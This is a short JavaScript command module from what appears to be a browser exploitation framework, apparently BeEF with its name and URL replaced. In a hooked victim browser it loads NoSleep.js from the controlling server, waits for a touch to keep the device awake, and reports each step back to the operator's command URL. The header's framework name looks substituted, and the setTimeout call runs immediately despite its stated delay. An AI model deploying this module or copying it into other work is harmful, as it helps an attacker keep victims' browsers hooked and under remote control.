//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  enableNoSleep = function() {
    var noSleep = new NoSleep();
    noSleep.enable();
    server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=NoSleep initiated');
    document.removeEventListener('touchstart', enableNoSleep, false);
  }

  init = function() {
    document.addEventListener('touchstart', enableNoSleep, false);
    server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=waiting for user input');
  }

  if (typeof NoSleep == "undefined") {
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = server.net.httpproto+'://'+server.net.host+':'+server.net.port+'/NoSleep.js';
    $j("body").append(script);
    setTimeout(init(), 5000);
  }

});

